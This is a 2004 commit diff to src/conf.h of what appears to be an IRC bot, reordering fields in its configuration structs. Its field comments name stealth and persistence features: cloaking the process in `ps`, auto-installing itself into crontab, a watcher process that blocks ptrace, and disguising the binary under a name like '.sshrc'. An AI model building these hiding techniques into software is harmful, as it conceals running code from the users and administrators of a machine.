6213490db0862e89566b2c410339a8deab1a7403
Bryan Drewery <bryan@shatow.net>
2004-10-15 16:43:33 +0000

    svn: 1286

--- src/conf.h
+++ src/conf.h
@@ -10,35 +10,35 @@
 typedef struct conf_bot_b {
   struct conf_bot_b *next;
   struct userrec *u;	/* our own user record */
+  pid_t pid;              /* contains the PID for the bot (read for the pidfile) */
+#ifdef LEAF
+  int localhub;         /* bot is localhub */
+#endif /* LEAF */
   char *nick;
   char *host;
   char *host6;
   char *ip;
   char *ip6;
-  pid_t pid;              /* contains the PID for the bot (read for the pidfile) */
   char *pid_file;       /* path and filename of the .pid file */
-#ifdef LEAF
-  int localhub;         /* bot is localhub */
-#endif /* LEAF */
 } conf_bot;
 
 typedef struct conf_b {
   conf_bot *bots;       /* the list of bots */
   conf_bot *bot;        /* single bot (me) */
-  char *localhub;	/* my localhub */
   uid_t uid;
+  int autouname;        /* should we just auto update any changed in uname output? */
+  int pscloak;          /* should the bots bother trying to cloak `ps`? */
+  int autocron;         /* should the bot auto crontab itself? */
+  int watcher;		/* spawn a watcher pid to block ptrace? */
+  port_t portmin;       /* for hubs, the reserved port range for incoming connections */
+  port_t portmax;       /* for hubs, the reserved port range for incoming connections */
+  char *comments;       /* we dont want to lose our comments now do we?! */
+  char *localhub;	/* my localhub */
   char *uname;
   char *username;       /* shell username */
   char *homedir;        /* homedir */
-  int autouname;        /* should we just auto update any changed in uname output? */
-  int pscloak;          /* should the bots bother trying to cloak `ps`? */
-  port_t portmin;       /* for hubs, the reserved port range for incoming connections */
-  port_t portmax;       /* for hubs, the reserved port range for incoming connections */
   char *binpath;        /* path to binary, ie: ~/ */
   char *binname;        /* binary name, ie: .sshrc */
-  int autocron;         /* should the bot auto crontab itself? */
-  int watcher;		/* spawn a watcher pid to block ptrace? */
-  char *comments;       /* we dont want to lose our comments now do we?! */
 } conf_t;
 
 extern conf_t		conf, conffile;
